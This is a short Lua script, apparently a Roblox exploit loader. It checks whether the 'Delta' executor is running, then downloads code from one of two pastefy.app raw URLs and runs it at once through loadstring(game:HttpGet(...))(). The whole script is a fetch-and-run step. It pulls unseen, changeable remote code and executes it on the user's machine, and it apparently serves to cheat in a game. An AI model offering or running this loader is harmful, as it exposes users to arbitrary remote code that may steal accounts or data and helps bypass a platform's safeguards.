task.spawn(function()
    local success, executor = pcall(identifyexecutor)

    if success and executor and string.find(executor, "Delta") then       
loadstring(game:HttpGet("https://pastefy.app/7SlhG8yG/raw"))()
        else
     loadstring(game:HttpGet("https://pastefy.app/RViMCyPV/raw"))()
     end
end)
